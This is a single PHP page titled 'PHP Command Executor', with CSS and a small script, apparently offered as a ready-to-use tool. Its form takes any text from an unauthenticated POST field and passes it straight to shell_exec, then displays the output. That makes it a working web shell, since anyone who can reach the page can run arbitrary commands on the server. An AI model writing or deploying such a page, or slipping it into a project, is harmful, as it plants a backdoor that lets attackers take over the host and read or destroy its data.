<?php
// PHP code to execute a command (e.g., `ls` or `dir`) and capture the output
if (isset($_POST['run_command'])) {
    $command = $_POST['command'];
    $output = shell_exec($command);
} else {
    $output = '';
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Command Executor</title>

    <!-- CSS Styles -->
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #333;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 500px;
        }
        h1 {
            font-size: 24px;
            margin-bottom: 20px;
        }
        textarea {
            width: 100%;
            height: 150px;
            font-family: monospace;
            font-size: 14px;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        button {
            padding: 10px 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
        .output {
            background-color: #f1f1f1;
            padding: 10px;
            margin-top: 20px;
            font-family: monospace;
            border: 1px solid #ddd;
            border-radius: 5px;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>Execute Command in PHP</h1>

        <form method="POST">
            <textarea name="command" placeholder="Enter your command here..."><?php echo isset($command) ? htmlspecialchars($command) : ''; ?></textarea><br>
            <button type="submit" name="run_command">Run Command</button>
        </form>

        <?php if ($output !== ''): ?>
            <div class="output">
                <h3>Command Output:</h3>
                <pre><?php echo htmlspecialchars($output); ?></pre>
            </div>
        <?php endif; ?>
    </div>

    <!-- JavaScript (for better user interaction, if needed) -->
    <script>
        // JavaScript to enhance the user experience, e.g., clear the output after a certain time or give feedback
        document.querySelector("form").onsubmit = function () {
            document.querySelector(".output").innerHTML = "Processing...";
        };
    </script>

</body>
</html>

